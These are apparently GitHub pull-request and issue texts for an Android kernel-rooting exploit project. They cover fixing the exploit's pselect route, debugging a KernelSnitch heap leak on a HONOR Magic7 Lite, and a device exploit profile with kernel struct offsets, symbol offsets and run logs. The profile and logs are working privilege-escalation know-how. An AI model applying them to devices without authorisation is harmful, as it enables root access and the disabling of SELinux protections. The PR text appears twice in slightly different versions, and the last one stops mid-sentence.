items.title: Stop the select route from destroying unrelated file descriptors
items.body:
# Stop the select route from destroying unrelated file descriptors

## Note
**This PR is a preliminary fix for 5.10 series kernel support.**

## Problem

`SelectStackRoute` builds its pselect fd_sets out of the waiter stamp, so the payload words *are* the bit
pattern: `open_selected_fds()` dup2s one of the route's own descriptors over every fd <
`PSELECT_ROUTE_NFDS` (320) whose bit happens to be set, and `destroy()` closed that quasi-random set. Only
stdio had a backup. Any
long-lived descriptor in that range — app fds, and the W2 victim's protocol pipes — was silently replaced
for the length of the dance and closed afterwards.

Observed while porting to a 5.10 kernel: the victim's command pipe was replaced at `prepare()`, the rooted
child read EOF, took its post-loop `getuid() != 0` guard and exited about one dance before the cred write
landed. `verify_w2_stage()` then hit EPIPE on every attempt and returned 0 *without printing anything*, so
W2 retried forever against an empty log. Every write landed; the chain never completed.

## Change

One commit, `fix(route): stop the select route from destroying unrelated file descriptors`.

**Snapshot and restore.** Every slot the dup2 pass rebinds is copied first — the descriptor plus its
`FD_CLOEXEC` state — and put back once the pselect returns, next to `restore_standard_io`; `destroy()`
restores instead of closing. A slot that was already closed is closed again; a live slot whose copy failed
is told apart from a closed one by reading `F_GETFD` first, and reported with its errno instead of passing
as closed.

**The forced exception slot.** It is installed after the bit scan, so the scan never snapshotted it:
whenever the stamp left its bit clear, that slot was rebound with no backup — the one descriptor in the
range the pass could still destroy for good, and a live app descriptor on any device holding that many fds
open. It now joins the scan.

**The victim's parent-held pipe ends** move above the range with `F_DUPFD_CLOEXEC`, and a failed move
fails the spawn: `fork()` needs no descriptor, so a child would otherwise run with an endpoint the route
can clobber.

**`verify_w2_stage()`** no longer returns 0 silently: both early returns print `errno`, which separates a
dead child (EPIPE, 0-byte reply) from a live one that is not consuming (full pipe, EAGAIN).

**Host coverage.** The snapshot lives outside the `__ANDROID__` guard — `destroy()` is host-compiled and
calls the restore — and it reports through its return value rather than printing, so the host test drives
the round trip: an open slot, a closed slot, `FD_CLOEXEC` on both sides, and the forced slot with its bit
left clear.

Three details worth knowing while reviewing:

- Backups are placed at `PSELECT_ROUTE_NFDS + 64`, above the range the pass walks — a copy inside the range
  could be poisoned by a later iteration of the same loop.
- `dup2` clears `FD_CLOEXEC` on its target, so the flag is read before the dup2 and re-applied after;
  otherwise a close-on-exec descriptor would come back without it.
- The restore zeroes its count, so `destroy()`'s call is a no-op when the per-attempt restore already ran.
  The consumer-stuck path deliberately keeps the installed descriptors, matching
  `retain_for_process_lifetime()`.

## Testing

Device: Redmi K50 Ultra (`diting`, SM8475), `5.10.236-android12-9-00003-gfb24cf99ad97-ab14313284`,
`select_stack` route, on both ROM builds that share that kernel (CN and Xiaomi.eu). Before: the chain
stopped at W2 on every run, silently. After: W1 → W2 (`child is root!`) → W3 → root script at `uid=0` →
KernelSU late-load, across a run series on the patched and on the stock kernel.

Re-run against this commit as a regression gate, because the fixes changed the fd path after that series:
three consecutive runs, every stage on attempt 1, `exploit complete` at T+31.5 s / 30.5 s / 35.2 s, root
script at `uid=0`, `native exited code=0`, SELinux restored to enforcing. No oops or panic in the kernel
log, and none of the new diagnostics fired — this device holds ~149 fds, far below the copy range, so the
uncopied-slot branch is not reachable on it as measured.

**Not tested: 6.6 / 6.12**.

items.title: [Device Support] HONOR Magic7 Lite (BRP-N21M, SM6450, kernel 5.10.252) - CPU picker default (4,5) is outside the app's own cpuset, which silently breaks KernelSnitch
items.body:
## TL;DR

Two separate things, both worth a look:

1. **A concrete bug with a clean workaround:** the app defaults the CPU pair to **4,5** on this device, but the
   app process's `Cpus_allowed_list` is **`0-3,6-7`**. The exploit therefore hits
   `SYSCHK(sched_setaffinity(0, sizeof(cpu_set_t), &cpuset)): Invalid argument` **hundreds of times**, and the
   KernelSnitch `mm_struct` leak then fails on every attempt. **Selecting the `6,7 · 2.21 GHz` pair in the
   picker removes all EINVAL errors and the leak starts succeeding** (`0xffffff87a68cbc00`,
   `0xffffff87f826f800`) — though only intermittently (roughly a quarter to a half of attempts).

2. **What remains after the workaround:** the leak's hit rate is low, and the runs that do leak a valid
   `mm_struct` then stop at `prepare_kernel_page`'s even-byte rejection
   (`page ... stores an even byte over selinux_state.initialized; taking another`). No run so far has reached
   the `multicast_waiter` route stage. There is **no kernel panic** — the process just exits
   (`code=1`, or `code=137` once under memory pressure).

---

## 1. The CPU-pair / cpuset mismatch (the actionable finding)

App process cpuset on this device:

```
$ adb shell cat /proc/$(pidof com.ghostlock.app)/status | grep Cpus_allowed_list
Cpus_allowed_list:	0-3,6-7
```

The app's own CPU picker offers three pairs, and **the first one (which is selected by default here) is not in
that set**:

```
4,5 · 2.21 GHz     <-- default selected
6,7 · 2.21 GHz     <-- inside 0-3,6-7
0,1 · 1.80 GHz     <-- inside 0-3,6-7
```

CPU topology on the device:

```
possible : 0-7      present : 0-7      online : 0-7
cpu0-3   : 1804800 kHz
cpu4-7   : 2208000 kHz
nproc    : 6
```

With the default pair the log fills with these (a single run produced over a hundred):

```
[!] SYSCHK(sched_setaffinity(0, sizeof(cpu_set_t), &cpuset)): Invalid argument
```

and the leak never succeeds:

```
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +125ms
[*] [spray] finding futex collisions... +271ms
[*] [spray] early collision screen 12/7 at 31%
[*] [spray] futex collisions found +776ms
[*] [spray] mm_struct leaked=0xffffffffffffffff +3186ms
[-] KernelSnitch mm_struct leak failed
   ... same on all four prepare_kernel_page attempts ...
[-]   heap spray failed
[-] W1: SELinux attempt 1 route failed; backing off
[-] Write 1 failed
<b> native exited code=1
```

After selecting `6,7` in the picker (verified: the main screen then reads `CPU cores  6,7 · 2.21 GHz`):

```
[*] cpu pair: main=6 consumer=7
[*] main thread running on cpu=6
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +127ms
[*] [spray] mm_struct leaked=0xffffff87a68cbc00 +737ms     <-- valid
[*] [spray] mm_struct leaked=0xffffff87f826f800 +1037ms    <-- valid
```

**EINVAL count went from >100 to 0**, and valid leaks appeared. This looks like a genuine defect in how the
recommended/selected CPU pair is chosen for this device: the pair the picker defaults to is outside the process
cpuset, so the affinity calls fail and the timing-sensitive leak cannot work. Whether the picker should filter
to the current cpuset (or the resolver should prefer a pair inside it) is a maintainer decision, but it is easy
to reproduce and, from a user's perspective, looks like "the app says Supported but the exploit never works".

## 2. What still fails after the workaround

Three runs with the `6,7` pair:

| run | cpuset EINVAL | `mm_struct` leaks | outcome |
|---|---|---|---|
| 1 | 0 | all `0xffffffffffffffff` | `native exited code=137` (SIGKILL, during a spray) |
| 2 | 0 | 1 valid, 3 failed | `prepare_kernel_page` retries exhausted, `exit code=1` |
| 3 | 0 | all `0xffffffffffffffff` | `prepare_kernel_page` retries exhausted, `exit code=1` |

In the run where a valid `mm_struct` did appear, the next stage rejected the candidate page:

```
[-] page ffffff87f8268000 stores an even byte over selinux_state.initialized; taking another
[-] prepare_kernel_page retry 2/4 +1945ms
```

So the KernelSnitch hit rate itself is the limiting factor now, plus the repeated
`selinux_state.initialized` rejection. Notably this is the same pair of symptoms reported for the HONOR 400
Smart in #372 (`prepare_kernel_page` even-byte rejection, then a route-stage failure), so the two devices may
share a cause.

Relevant kernel config for this device (from the boot image):

```
CONFIG_KASAN=y
CONFIG_KASAN_HW_TAGS=y
CONFIG_SLUB=y / CONFIG_SLUB_DEBUG=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_ARM64_4K_PAGES=y / CONFIG_ARM64_VA_BITS=39
```

`kernelsnitch.mm_struct_sz` was tried at 512 and 4096 as well as the default 1024; none changed the hit rate
appreciably.

---

## The profile I built (so the device is reproducible)

`ghostlock-extract` on this kernel's `boot.img`:

```
primitive                remove_waiter@0x1ecf3c unpatched          <-- CVE present
rt_mutex_waiter          (no rt_mutex_waiter type in BTF)
mm_struct size           (unavailable)
pselect chain            not attempted (no embedded BTF)
path multicast_waiter    available (ip_mc_msfadd=absent ip_mc_source@0xffffffc0094c6f78)
path select_stack        available (core_sys_select@0xffffffc00857193c futex_wait@0xffffffc008292fc0)
path tcp_zerocopy        available (tcp_zerocopy_receive@0xffffffc00946f788)
suggested route          multicast_waiter (medium)
reasons                  - 5.x kernel with the multicast path present
                         - pselect route not derivable on this layout
info: multicast waiter_off derived = 0x150 (setsockopt depth 0x360 - futex depth 0x210)
warning: 5.10.252-... is unverified; no family-derived geometry will be emitted
warning: embedded BTF not found; struct offsets fall back to target.h defaults
warning: credential template omitted; the built-in profile must supply it
```

The extractor's `waiter_off = 0x150` (336) cannot be used as written — PROFILE_SCHEMA requires
`waiter_off + lock_offset + 8 <= buffer_size`, and with the bundled 5.15 multicast `buffer_size = 264` that is
336 + 56 + 8 = 400 > 264. So the route fields use the values all five bundled 5.15 multicast profiles agree on
(`waiter_off=96`, `buffer_size=264`, `task_offset=48`, `lock_offset=56`), which also keeps the trio consistent
with arm64 `rt_mutex_waiter` (task @0x30, lock @0x38). `task_struct.*` comes from this device's own offsets;
`cred.*` uses the bundled 6.x credential values with `copy_size` raised to 176 for the multicast requirement
`copy_size >= 0xa0`.

```hocon
release = "5.10.252-android12-9-00009-gf960ed27302b-ab15212796"
schema_version = 1
kernel_major = 5
recommend_shizuku = 0
kernel_phys_load = null
kernel_phys_offset = null
route {
  multicast_waiter {
    waiter_off = 96
    buffer_size = 264
    task_offset = 48
    lock_offset = 56
    compact_waiter = 1
  }
}
fallback { to = "none" }
kernelsnitch { collisions = 8  mm_struct_sz = 1024 }
task_struct {
  prio=132 normal_prio=140 sched_task_group=784 pi_lock=2156 pi_waiters=2176
  pi_top_task=2192 pi_blocked_on=2196 pid=1480 tgid=1484 atomic_flags=1424
  real_cred=1912 cred=1920 comm=1936 tasks=1224 seccomp=2120
}
cred {
  copy_size=176 usage_offset=0 usage_value=1 caps_offset=48 caps_count=5 caps_value=-1
  ref_count=4
  ref0_offset=96  ref0_image=1
  ref1_offset=104 ref1_image=1
  ref2_offset=112 ref2_image=1
  ref3_offset=120 ref3_image=1
}
offset {
  init_task=41598080 init_cred=41683040 empty_zero_page=43642880 root_task_group=43663424
  selinux_enforcing=44383128 selinux_blob_sizes=36682368 security_hook_heads=36680680
  slide_nfulnl_logger=41554240 slide_loggers_0_1=41554040 slide_boot_id=44510141
}
```

This imports cleanly, validates (`hasProfile=true invalid=0`), the app shows **Supported / Profile ready**, and
the compiled `profile.bin` decodes as `frontend=1 backend=1 middleware=3`, i.e. the `multicast_waiter` route is
selected. So the profile side looks correct.

---

## Device

| Field | Value |
|---|---|
| Model | HONOR Magic7 Lite (BRP-N21M / BRP-NX1M) |
| SoC | Qualcomm **SM6450** ("parrot") |
| Build | `BRP-N21M 10.0.0.168D(DEMC819E6R1P1)` |
| Kernel | `5.10.252-android12-9-00009-gf960ed27302b-ab15212796` |
| SELinux | Enforcing; app path is `u:r:untrusted_app:s0`, `Seccomp=2 Seccomp_filters=1` |
| Bootloader | locked, dm-verity enforcing |
| cpuset | app process restricted to `0-3,6-7` |

---

## Questions

1. **CPU pair:** should the app's recommended/selected CPU pair be constrained to the process's
   `Cpus_allowed_list`? On this device the picker's default (`4,5`) is outside `0-3,6-7`, and every
   `sched_setaffinity` then fails with `EINVAL`, which silently disables the leak. Selecting `6,7` fixes it.
2. Does KernelSnitch work reliably on kernels with `CONFIG_KASAN_HW_TAGS=y` +
   `CONFIG_SLAB_FREELIST_RANDOM=y` + `CONFIG_SLAB_FREELIST_HARDENED=y`? Is `kernelsnitch.mm_struct_sz` the right
   knob for such kernels (1024/512/4096 made no clear difference here), or is the low hit rate expected?
3. The `stores an even byte over selinux_state.initialized` rejection is identical to what #372 reports on the
   HONOR 400 Smart. Are these two devices hitting the same root cause?
4. Is `multicast_waiter` correct for this 5.10 kernel? The extractor suggests it while also saying the pselect
   route is not derivable here.
5. `cred.refN_image` had to be filled with non-zero placeholders because 5.10.252 has no BTF and the extractor
   omits the credential template for 5.x. Is there a supported way to derive those on a 5.x kernel?

Happy to run any diagnostic build, or to collect `/proc/iomem`, `dmesg`, extra logs, or a
`ghostlock-extract --analysis` dump for this kernel on request.

[2-ATTACH-CPU45-EINVAL.log.txt](https://github.com/user-attachments/files/33275287/2-ATTACH-CPU45-EINVAL.log.txt)
[3-ATTACH-CPU67-VALID-LEAK.log.txt](https://github.com/user-attachments/files/33275285/3-ATTACH-CPU67-VALID-LEAK.log.txt)
[4-ATTACH-magic7-multicast-v3.conf.txt](https://github.com/user-attachments/files/33275286/4-ATTACH-magic7-multicast-v3.conf.txt)
[5-ATTACH-compiled-profile.bin.txt](https://github.com/user-attachments/files/33275284/5-ATTACH-compiled-profile.bin.txt)

items.title: Stop the select route from destroying unrelated file descriptors
items.body:
# Stop the select route from destroying unrelated file descriptors

## Note
**This a preliminary fix for 5.10 series kernel support.**

## Problem

`SelectStackRoute` builds its pselect fd_sets out of the waiter stamp, so the payload words *are* the bit
pattern: `open_selected_fds()` dup2s one of the route's own descriptors over every fd <
`PSELECT_ROUTE_NFDS` (320) whose bit happens to be set, and `destroy()` closed that quasi-random set. Only
stdio had a backup. Any
long-lived descriptor in that range — app fds, and the W2 victim's protocol pipes — was silently replaced
for the length of the dance and closed afterwards.

Observed while porting to a 5.10 kernel: the victim's command pipe was replaced at `prepare()`, the rooted
child read EOF, took its post-loop `getuid() != 0` guard and exited about one dance before the cred write
landed. `verify_w2_stage()` then hit EPIPE on every attempt and returned 0 *without printing anything*, so
W2 retried forever against an empty log. Every write landed; the chain never completed.

## Changes

| commit | what it does |
|---|---|
| `fix(victim)`: keep protocol fds out of the select route's fd range | the parent-held pipe ends are moved above the range with `F_DUPFD_CLOEXEC`; the dup2 pass never reaches them |
| `fix(route)`: snapshot and restore every fd the select route's dup2 pass clobbers | each touched slot is copied — and its `FD_CLOEXEC` state captured — before the dup2, restored once the pselect returns; `destroy()` restores instead of closing |
| `fix(session)`: report why the W2 verifier gave up | both early returns print `errno`, which separates a dead child (EPIPE, 0-byte reply) from a live child that is not consuming (full pipe, EAGAIN) |
| `fix(route)`: tell a closed fd from an uncopyable one when backing up the select fds | a slot that was closed and a backup copy that failed both produced `backup = -1`; `F_GETFD` now separates them, and a lost descriptor is reported instead of silently closed |

Three details worth knowing while reviewing:

- Backups are placed at `PSELECT_ROUTE_NFDS + 64`, above the range the pass walks — a copy inside the range
  could be poisoned by a later iteration of the same loop.
- `dup2` clears `FD_CLOEXEC` on its target, so the flag is read before the dup2 and re-applied after;
  otherwise a close-on-exec descriptor would come back without it.
- The restore zeroes its count, so `destroy()`'s call is a no-op when the per-attempt restore already ran.
  The consumer-stuck path deliberately keeps the installed descriptors, matching
  `retain_for_process_lifetime()`.

## Testing

Device: Redmi K50 Ultra (`diting`, SM8475), `5.10.236-android12-9-00003-gfb24cf99ad97-ab14313284`,
`select_stack` route, on both ROM builds that share that kernel (CN and Xiaomi.eu). Before: the chain
stopped at W2 on every run, silently. After: W1 → W2 (`child is root!`) → W3 → root script at `uid=0` →
KernelSU late-load, across a run series on the patched and on the stock kernel.

**Not tested: 6.6 / 6.12**, the families where `select_stack` is the primary route — we have one 5.10
device. The change is descriptor bookkeeping with no kernel-version-dependent code, and the two other
routes never touch the fd table (`tcp_zerocopy_route.cpp` and `multicast_waiter_route.cpp` contain no
`dup2`/`F_DUPFD`), so the blast radius is the select route's own fd handling. The last commit's failure
branch is unreachable on our device (`RLIMIT_NOFILE` 32768, ~149 descriptors in use, copies need fd ≥ 384)
and is behaviorally identical on the success path — same syscall count.

See the extractor logs below:
